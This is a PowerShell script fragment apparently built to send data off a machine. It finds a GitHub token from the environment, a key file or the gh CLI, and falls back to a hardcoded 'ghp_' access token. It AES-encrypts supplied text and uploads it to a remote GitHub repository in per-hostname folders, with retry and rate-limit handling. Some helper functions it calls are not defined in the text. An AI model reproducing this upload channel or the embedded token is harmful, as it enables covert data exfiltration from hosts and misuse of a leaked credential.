#Requires -Version 5.1
<#
#>

# ============================================================
# 0. HEADER
# ============================================================
$ErrorActionPreference = 'Continue'
[Console]::OutputEncoding = [Text.UTF8Encoding]::new($false)
$OutputEncoding          = [Text.UTF8Encoding]::new($false)

$script:Prog    = 'avaigen'

function Get-GhToken {
    if ($script:GhTokenCache) { return $script:GhTokenCache }

    $t = $null
    if ($env:GITHUB_TOKEN) {
        $t = $env:GITHUB_TOKEN
    } elseif ($env:GH_TOKEN) {
        $t = $env:GH_TOKEN
    } elseif (Test-Path -LiteralPath "$HOME/.aghanim-api-key" -PathType Leaf) {
        $t = Get-Content -LiteralPath "$HOME/.aghanim-api-key" -Raw -Encoding UTF8
    } elseif (Get-Command gh -ErrorAction SilentlyContinue) {
        $t = gh auth token --user Aghanim-sec 2>$null
        if ($LASTEXITCODE -ne 0) { $t = $null }
    }

    if (-not $t) { $t = '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' }

    if ($t) { $script:GhTokenCache = ($t -replace "`r|`n",'').Trim() }
    return $script:GhTokenCache
}

function Get-HttpStatus {
    param($ErrorRecord)
    try {
        if ($ErrorRecord.Exception.Response) {
            return [int]$ErrorRecord.Exception.Response.StatusCode
        }
    } catch { }
    return 0
}

function Invoke-GhRequest {
    param(
        [Parameter(Mandatory)][string]$Method,
        [Parameter(Mandatory)][string]$Url,
        [Parameter(Mandatory)][string]$Token,
        [string]$Body,
        [int]$MaxAttempts = 4
    )
    $headers = @{
        'Authorization'        = "Bearer $Token"
        'Accept'               = 'application/vnd.github+json'
        'X-GitHub-Api-Version' = '2022-11-28'
        'User-Agent'           = 'avaigen-ps'
    }
    $params = @{
        Method = $Method; Uri = $Url; Headers = $headers; ErrorAction = 'Stop'
    }
    if ($Body) {
        $params.Body = $Body
        $params.ContentType = 'application/json'
    }

    for ($attempt = 1; $attempt -le $MaxAttempts; $attempt++) {
        try {
            return Invoke-RestMethod @params
        } catch {
            $status = Get-HttpStatus $_
            $retryAfter = $null
            $remaining = $null

            try {
                if ($_.Exception.Response) {
                    $retryAfter = $_.Exception.Response.Headers['Retry-After']
                    $remaining  = $_.Exception.Response.Headers['X-RateLimit-Remaining']
                }
            } catch { }

            $retryable = ($status -eq 0 -or $status -eq 429 -or $status -ge 500)
            if ($status -eq 403) {
                # GitHub отдаёт 403 при исчерпании rate limit
                $retryable = ($retryAfter -or $remaining -eq '0')
            }
            if (-not $retryable -or $attempt -ge $MaxAttempts) { throw }

            $delay = [int][Math]::Min(30, [Math]::Pow(2, $attempt - 1))
            if ($retryAfter) { $delay = [Math]::Max($delay, [int]$retryAfter) }

            try {
                $reset = $_.Exception.Response.Headers['X-RateLimit-Reset']
                if ($reset) {
                    $wait = [int]$reset - [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
                    if ($wait -gt $delay) { $delay = [Math]::Min(120, $wait + 2) }
                }
            } catch { }

            [Console]::Error.WriteLine("GitHub HTTP $status, retry $attempt/$MaxAttempts in ${delay}s")
            Start-Sleep -Seconds $delay
        }
    }
}

function Upload-GhFile {
    param(
        [Parameter(Mandatory)][string]$Repo,
        [Parameter(Mandatory)][string]$Branch,
        [Parameter(Mandatory)][string]$Path,
        [Parameter(Mandatory)][string]$File,
        [Parameter(Mandatory)][string]$Token
    )
    $url = "$script:Api/repos/$Repo/contents/$Path"
    $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($File))

    $payload = [ordered]@{
        message = "sync $Path"
        branch  = $Branch
        content = $b64
    }
    $json = $payload | ConvertTo-Json -Compress

    try {
        # новые файлы пишем сразу, без лишнего GET sha
        $resp = Invoke-GhRequest -Method PUT -Url $url -Token $Token -Body $json
        return [bool]($resp.content.path -or $resp.commit.sha)
    } catch {
        $status = Get-HttpStatus $_
        if ($status -notin @(409, 422)) {
            [Console]::Error.WriteLine("Upload-GhFile: $($_.Exception.Message)")
            return $false
        }

        # файл уже существует — получаем sha и повторяем один раз
        try {
            $existing = Invoke-GhRequest -Method GET -Url "$url`?ref=$Branch" -Token $Token
            if (-not $existing -or -not $existing.sha) { throw 'existing file has no sha' }
            $payload['sha'] = $existing.sha
            $json = $payload | ConvertTo-Json -Compress
            $resp = Invoke-GhRequest -Method PUT -Url $url -Token $Token -Body $json
            return [bool]($resp.content.path -or $resp.commit.sha)
        } catch {
            [Console]::Error.WriteLine("Upload-GhFile: $($_.Exception.Message)")
            return $false
        }
    }
}

function Send-ToGitHub {
    param([string]$Kind = 'state', [string]$Text = $null)

    if ($script:BV_ALLOW_UPLOAD -ne '1') {
        err 'upload disabled (set BV_ALLOW_UPLOAD=1 to enable)'
        return $false
    }

    $token = Get-GhToken
    if (-not $token) { err 'ERROR: No API token provided.'; return $false }

    $raw = ($Text -replace "`r`n", "`n").TrimEnd("`n")
    if (-not $raw) { err 'ERROR: Empty input.'; return $false }

    $cipher = $null
    try { $cipher = Protect-StringAes256Cbc -PlainText $raw -Passphrase $script:SecretKey }
    catch { err "Encryption failed: $($_.Exception.Message)"; return $false }
    if (-not $cipher) { err 'Encryption failed'; return $false }

    $safeKind = ($Kind -replace '[^A-Za-z0-9_-]', '_')
    $hostName = if ($env:COMPUTERNAME) { $env:COMPUTERNAME } elseif ($env:HOSTNAME) { $env:HOSTNAME } else { 'host' }
    $safeHost = ($hostName -replace '[^A-Za-z0-9_.-]', '_')
    $ts = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()
    $suffix = [guid]::NewGuid().ToString('N').Substring(0, 6)
    $path = "data/$safeHost/${safeKind}_${ts}_${suffix}.bin"

    $tmp = [IO.Path]::GetTempFileName()
    try {
        [IO.File]::WriteAllText($tmp, $cipher, [Text.UTF8Encoding]::new($false))
        [Console]::Error.WriteLine("[*] Uploading to $script:Owner/$script:Repo -> $path")
        $ok = Upload-GhFile -Repo "$($script:Owner)/$($script:Repo)" `
                            -Branch $script:Branch -Path $path -File $tmp -Token $token
        if ($ok) {
            [Console]::Error.WriteLine("OK -> $path")
            return $true
        }
        [Console]::Error.WriteLine("ERROR: Upload-GhFile failed for $path")
        return $false
    } finally {
        Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue
    }
}
